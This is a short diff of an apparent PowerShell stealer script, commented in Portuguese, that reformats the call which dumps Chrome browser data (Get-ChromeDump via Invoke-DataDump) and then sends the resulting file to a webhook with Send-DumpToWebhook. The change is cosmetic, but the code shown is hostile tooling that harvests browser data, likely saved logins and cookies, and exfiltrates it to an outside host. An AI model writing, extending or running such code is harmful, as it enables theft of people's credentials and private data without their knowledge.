@@ -307,7 +307,11 @@ function Clear-All {
 }
 
 #### Executa ####
-$out = Invoke-DataDump -DumpCommand { Get-ChromeDump -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault
+$out = Invoke-DataDump `
+    -DumpCommand { Get-ChromeDump -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } `
+    -OutputFile $OutputFileDefault `
+    -ExportDir $ExportDirDefault
+
 Send-DumpToWebhook `
     -FilePath $out `
     -WebhookUrl $WebhookUrl `
